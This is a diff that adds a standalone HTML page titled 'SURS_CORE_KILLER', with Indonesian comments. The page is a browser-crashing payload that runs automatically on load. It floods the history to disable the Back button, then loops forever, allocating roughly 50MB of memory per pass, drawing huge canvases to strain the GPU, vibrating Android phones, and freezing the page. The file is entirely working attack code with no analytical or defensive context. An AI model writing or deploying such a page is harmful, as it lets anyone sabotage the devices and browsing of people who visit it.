@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>SURS_CORE_KILLER</title>
+    <style>
+        body { background: #000; margin: 0; padding: 0; overflow: hidden; }
+    </style>
+</head>
+<body>
+    <script>
+        // EKSEKUSI OTOMATIS SAAT HALAMAN DIMUAT
+        window.onload = function() {
+            // 1. Kunci Navigasi (Mencegah tombol 'Back' berfungsi)
+            for (let i = 0; i < 2000; i++) {
+                window.history.pushState(null, null, "#Noxa_" + Math.random());
+            }
+
+            // 2. Heavy Duty Payload
+            const storage = [];
+            
+            // Loop tak terbatas dengan kecepatan tinggi
+            while(true) {
+                // Menguras RAM secara eksponensial (50MB per putaran)
+                let chunk = new Uint32Array(1024 * 1024 * 12.5); 
+                chunk.fill(0xFFFFFFFF);
+                storage.push(chunk);
+
+                // Membebani GPU (Graphics Processing Unit)
+                let canvas = document.createElement('canvas');
+                canvas.width = 10000;
+                canvas.height = 10000;
+                let ctx = canvas.getContext('2d');
+                ctx.fillRect(0, 0, 10000, 10000);
+
+                // Memicu getaran terus-menerus (Khusus Android)
+                if (navigator.vibrate) {
+                    navigator.vibrate([2000, 100, 2000]);
+                }
+
+                // Memaksa thread utama untuk membeku
+                window.scrollTo(Math.random(), Math.random());
+                console.log("NOXA_KILL_COMMAND_" + storage.length);
+            }
+        };
+    </script>
+</body>
+</html>
